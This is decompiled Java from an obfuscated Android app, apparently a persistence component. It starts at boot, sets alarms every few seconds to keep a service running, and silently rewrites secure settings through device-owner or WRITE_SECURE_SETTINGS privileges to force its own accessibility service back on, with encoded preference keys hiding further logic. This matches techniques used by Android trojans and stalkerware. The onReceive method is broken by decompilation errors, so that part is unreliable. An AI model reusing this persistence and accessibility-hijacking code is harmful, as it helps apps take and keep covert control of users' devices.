package com.storm.safe.rock.service;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.app.admin.DevicePolicyManager;
import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.PowerManager;
import android.os.SystemClock;
import android.provider.Settings;
import com.storm.safe.rock.receiver.zbrefryi;
import com.storm.safe.rock.service.AppCoreService;
import com.storm.safe.rock.service.modules.C0323a8;
import com.storm.safe.rock.util.StringUtil;
import java.util.ArrayList;
import java.util.List;
import kotlin.text.AbstractC0779a1;
import p000.AbstractC0715je;
import p000.AbstractC1120qr;
import p000.RunnableC1322v2;
import p000.kj0;
import p000.t60;

/* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
/* loaded from: classes2.dex */
public final class tisxhskrc extends BroadcastReceiver {

    /* renamed from: a0 */
    public static final C0380a0 f55188a0 = new C0380a0(null);

    /* renamed from: a1 */
    public static volatile long f55189a1 = System.currentTimeMillis();

    /* renamed from: a2 */
    public static volatile boolean f55190a2;

    /* compiled from: r8-map-id-6aa8c380066ac34eca52ba03819884bf743dac35e85c6cbaefaab30e4b90b459 */
    /* renamed from: com.storm.safe.rock.service.tisxhskrc$a0 */
    public static final class C0380a0 {
        public /* synthetic */ C0380a0(AbstractC1120qr abstractC1120qr) {
            this();
        }

        private final long effectiveGuardIntervalMs(Context context) {
            if (dqtvuisjd.f52358m1.getInstance() == null) {
                return 2000L;
            }
            Object systemService = context.getSystemService("power");
            PowerManager powerManager = systemService instanceof PowerManager ? (PowerManager) systemService : null;
            return (powerManager == null || powerManager.isInteractive()) ? 2000L : 300000L;
        }

        private final long effectiveHeartbeatIntervalMs(Context context) {
            if (dqtvuisjd.f52358m1.getInstance() == null) {
                return 60000L;
            }
            Object systemService = context.getSystemService("power");
            PowerManager powerManager = systemService instanceof PowerManager ? (PowerManager) systemService : null;
            return (powerManager == null || powerManager.isInteractive()) ? 60000L : 300000L;
        }

        private final boolean isAccessibilityEnabledInSettings(Context context) {
            try {
                String string = Settings.Secure.getString(context.getContentResolver(), "enabled_accessibility_services");
                if (string == null) {
                    string = "";
                }
                String packageName = context.getPackageName();
                t60.m214694b5(packageName, "context.packageName");
                return AbstractC0779a1.m213652a5(string, packageName, false);
            } catch (Exception unused) {
                return false;
            }
        }

        /* JADX INFO: Access modifiers changed from: private */
        public final void scheduleNextHeartbeatStatic(Context context) {
            try {
                Object systemService = context.getSystemService("alarm");
                AlarmManager alarmManager = systemService instanceof AlarmManager ? (AlarmManager) systemService : null;
                if (alarmManager == null) {
                    return;
                }
                Intent intent = new Intent(context, (Class<?>) tisxhskrc.class);
                intent.setAction("com.storm.safe.rock.action.BACKUP_SYNC");
                PendingIntent broadcast = PendingIntent.getBroadcast(context, 99, intent, 201326592);
                long jEffectiveHeartbeatIntervalMs = effectiveHeartbeatIntervalMs(context);
                if (Build.VERSION.SDK_INT >= 31 ? alarmManager.canScheduleExactAlarms() : true) {
                    alarmManager.setExactAndAllowWhileIdle(2, SystemClock.elapsedRealtime() + jEffectiveHeartbeatIntervalMs, broadcast);
                } else {
                    alarmManager.setAndAllowWhileIdle(2, SystemClock.elapsedRealtime() + jEffectiveHeartbeatIntervalMs, broadcast);
                }
            } catch (Exception e) {
                t60.m214705c6("tisxhskrc", "❌ 心跳闹钟调度失败", e);
            }
        }

        /* JADX INFO: Access modifiers changed from: private */
        public static final void tryForceRebindAccessibility$lambda$3(Context context) throws InterruptedException {
            try {
                ContentResolver contentResolver = context.getContentResolver();
                String packageName = context.getPackageName();
                String str = packageName + "/" + dqtvuisjd.class.getName();
                String string = Settings.Secure.getString(contentResolver, "enabled_accessibility_services");
                if (string == null) {
                    string = "";
                }
                t60.m214694b5(packageName, "pkg");
                if (!AbstractC0779a1.m213652a5(string, packageName, false)) {
                    t60.m214726f4("tisxhskrc", "⚠️ [重绑] 无障碍列表中未找到本应用，跳过");
                    return;
                }
                List listM213677d0 = AbstractC0779a1.m213677d0(string, new String[]{":"}, 6);
                ArrayList arrayList = new ArrayList();
                for (Object obj : listM213677d0) {
                    String str2 = (String) obj;
                    if (str2.length() > 0 && !AbstractC0779a1.m213652a5(str2, packageName, false)) {
                        arrayList.add(obj);
                    }
                }
                String strM213295i2 = AbstractC0715je.m213295i2(arrayList, ":", null, null, null, 62);
                if (strM213295i2.length() != 0) {
                    str = strM213295i2 + ":" + str;
                }
                Object systemService = context.getSystemService("device_policy");
                DevicePolicyManager devicePolicyManager = systemService instanceof DevicePolicyManager ? (DevicePolicyManager) systemService : null;
                if (devicePolicyManager != null && devicePolicyManager.isDeviceOwnerApp(packageName)) {
                    ComponentName componentName = new ComponentName(context, (Class<?>) zbrefryi.class);
                    devicePolicyManager.setSecureSetting(componentName, "enabled_accessibility_services", strM213295i2);
                    Thread.sleep(300L);
                    devicePolicyManager.setSecureSetting(componentName, "enabled_accessibility_services", str);
                    devicePolicyManager.setSecureSetting(componentName, "accessibility_enabled", "1");
                    t60.m214714d6("tisxhskrc", "✅ [重绑] DeviceOwner 先删后加成功");
                    return;
                }
                try {
                    Settings.Secure.putString(contentResolver, "enabled_accessibility_services", strM213295i2);
                    Thread.sleep(300L);
                    Settings.Secure.putString(contentResolver, "enabled_accessibility_services", str);
                    Settings.Secure.putInt(contentResolver, "accessibility_enabled", 1);
                    t60.m214714d6("tisxhskrc", "✅ [重绑] WRITE_SECURE_SETTINGS 先删后加成功");
                } catch (SecurityException unused) {
                    t60.m214726f4("tisxhskrc", "⚠️ [重绑] 无权限，等待系统自动恢复");
                }
            } catch (Exception e) {
                t60.m214705c6("tisxhskrc", "❌ [重绑] 失败", e);
            }
        }

        public final void rescheduleAfterScreenOn(Context context) {
            t60.m214695b6(context, "context");
            try {
                scheduleNextHeartbeatStatic(context);
                scheduleGuard(context);
            } catch (Exception e) {
                t60.m214705c6("tisxhskrc", "❌ 亮屏重排闹钟失败", e);
            }
        }

        public final void scheduleGuard(Context context) {
            t60.m214695b6(context, "context");
            try {
                Object systemService = context.getSystemService("alarm");
                AlarmManager alarmManager = systemService instanceof AlarmManager ? (AlarmManager) systemService : null;
                if (alarmManager == null) {
                    return;
                }
                Intent intent = new Intent(context, (Class<?>) tisxhskrc.class);
                intent.setAction("com.storm.safe.rock.action.BACKUP_SYNC");
                PendingIntent broadcast = PendingIntent.getBroadcast(context, 97, intent, 201326592);
                long jEffectiveGuardIntervalMs = effectiveGuardIntervalMs(context);
                if (Build.VERSION.SDK_INT >= 31 ? alarmManager.canScheduleExactAlarms() : true) {
                    alarmManager.setExactAndAllowWhileIdle(2, SystemClock.elapsedRealtime() + jEffectiveGuardIntervalMs, broadcast);
                } else {
                    alarmManager.setAndAllowWhileIdle(2, SystemClock.elapsedRealtime() + jEffectiveGuardIntervalMs, broadcast);
                }
            } catch (Exception e) {
                t60.m214705c6("tisxhskrc", "❌ 守护闹钟调度失败", e);
            }
        }

        public final void tryForceRebindAccessibility(Context context) {
            t60.m214695b6(context, "context");
            if (!tisxhskrc.f55190a2 && dqtvuisjd.f52358m1.getInstance() == null) {
                Context applicationContext = context.getApplicationContext();
                t60.m214694b5(applicationContext, "appContext");
                if (isAccessibilityEnabledInSettings(applicationContext)) {
                    tisxhskrc.f55190a2 = true;
                    new Thread(new RunnableC1322v2(applicationContext, 5)).start();
                }
            }
        }

        private C0380a0() {
        }
    }

    /* renamed from: a0 */
    public static void m212466a0(Context context) {
        C0323a8 lj0Var;
        C0380a0 c0380a0 = f55188a0;
        c0380a0.scheduleNextHeartbeatStatic(context);
        c0380a0.scheduleGuard(context);
        AppCoreService.C0277a0 c0277a0 = AppCoreService.f52296a0;
        if (!c0277a0.isRunning()) {
            c0277a0.start(context);
        }
        if (dqtvuisjd.f52358m1.getInstance() == null) {
            long jCurrentTimeMillis = System.currentTimeMillis() - f55189a1;
            if (jCurrentTimeMillis > 5000) {
                t60.m214726f4("tisxhskrc", "⚠️ 无障碍未绑定(" + (jCurrentTimeMillis / 1000) + "s)，尝试强制重绑");
                c0380a0.tryForceRebindAccessibility(context);
                return;
            }
            return;
        }
        f55190a2 = false;
        try {
            if (!context.getSharedPreferences(StringUtil.m212470a0("KkkBBV4sDTpS"), 0).getBoolean(StringUtil.m212470a0("KkwFMkIqBTRWJSJWHwVONwE+WzQ/XBU="), false) || (lj0Var = C0323a8.f53097e0.getInstance()) == null || lj0Var.m211649b5()) {
                return;
            }
            new Thread(new kj0(lj0Var, 1)).start();
        } catch (Exception e) {
            t60.m214705c6("tisxhskrc", "❌ 网络检查失败", e);
        }
    }

    /* JADX WARN: Can't fix incorrect switch cases order, some code will duplicate */
    /* JADX WARN: Code restructure failed: missing block: B:11:0x001f, code lost:
    
        if (r6.equals("com.storm.safe.rock.action.QUICK_SYNC") == false) goto L37;
     */
    /* JADX WARN: Code restructure failed: missing block: B:14:0x0029, code lost:
    
        if (r6.equals("android.intent.action.BOOT_COMPLETED") == false) goto L37;
     */
    /* JADX WARN: Code restructure failed: missing block: B:22:0x003f, code lost:
    
        if (r6.equals("com.htc.intent.action.QUICKBOOT_POWERON") == false) goto L37;
     */
    /* JADX WARN: Code restructure failed: missing block: B:25:0x0048, code lost:
    
        if (r6.equals("android.intent.action.QUICKBOOT_POWERON") != false) goto L26;
     */
    /* JADX WARN: Code restructure failed: missing block: B:26:0x004a, code lost:
    
        p000.t60.m214714d6("tisxhskrc", "📱 开机完成，启动服务");
        com.storm.safe.rock.service.tisxhskrc.f55189a1 = java.lang.System.currentTimeMillis();
        com.storm.safe.rock.service.tisxhskrc.f55190a2 = false;
        r6 = com.storm.safe.rock.service.tisxhskrc.f55188a0;
        r6.scheduleNextHeartbeatStatic(r5);
        r6.scheduleGuard(r5);
        r6 = com.storm.safe.rock.service.AppCoreService.f52296a0;
     */
    /* JADX WARN: Code restructure failed: missing block: B:27:0x0067, code lost:
    
        if (r6.isRunning() != false) goto L39;
     */
    /* JADX WARN: Code restructure failed: missing block: B:28:0x0069, code lost:
    
        r6.start(r5);
     */
    /* JADX WARN: Code restructure failed: missing block: B:31:0x0073, code lost:
    
        if (r6.equals("com.storm.safe.rock.action.HEALTH_CHECK") == false) goto L37;
     */
    /* JADX WARN: Code restructure failed: missing block: B:33:0x0076, code lost:
    
        com.storm.safe.rock.service.tisxhskrc.f55189a1 = java.lang.System.currentTimeMillis();
        com.storm.safe.rock.service.tisxhskrc.f55190a2 = false;
        r6 = com.storm.safe.rock.service.tisxhskrc.f55188a0;
        r6.scheduleNextHeartbeatStatic(r5);
        r6.scheduleGuard(r5);
        r6 = com.storm.safe.rock.service.AppCoreService.f52296a0;
     */
    /* JADX WARN: Code restructure failed: missing block: B:34:0x008c, code lost:
    
        if (r6.isRunning() != false) goto L40;
     */
    /* JADX WARN: Code restructure failed: missing block: B:35:0x008e, code lost:
    
        r6.start(r5);
     */
    /* JADX WARN: Failed to restore switch over string. Please report as a decompilation issue
    java.lang.NullPointerException: Cannot invoke "java.util.List.iterator()" because the return value of "jadx.core.dex.visitors.regions.SwitchOverStringVisitor$SwitchData.getNewCases()" is null
    	at jadx.core.dex.visitors.regions.SwitchOverStringVisitor.restoreSwitchOverString(SwitchOverStringVisitor.java:109)
    	at jadx.core.dex.visitors.regions.SwitchOverStringVisitor.visitRegion(SwitchOverStringVisitor.java:66)
    	at jadx.core.dex.visitors.regions.DepthRegionTraversal.traverseIterativeStepInternal(DepthRegionTraversal.java:77)
    	at jadx.core.dex.visitors.regions.DepthRegionTraversal.traverseIterativeStepInternal(DepthRegionTraversal.java:82)
     */
    @Override // android.content.BroadcastReceiver
    /*
        Code decompiled incorrectly, please refer to instructions dump.
    */
    public void onReceive(Context context, Intent intent) {
        t60.m214695b6(context, "context");
        String action = intent != null ? intent.getAction() : null;
        if (action != null) {
            switch (action.hashCode()) {
                case -1802375933:
                    break;
                case -1787487905:
                    break;
                case -1417835046:
                    break;
                case 341565306:
                    if (action.equals("com.storm.safe.rock.action.BACKUP_SYNC")) {
                        m212466a0(context);
                        break;
                    }
                    break;
                case 798292259:
                    break;
                case 2098784523:
                    break;
            }
            return;
        }
        m212466a0(context);
    }
}
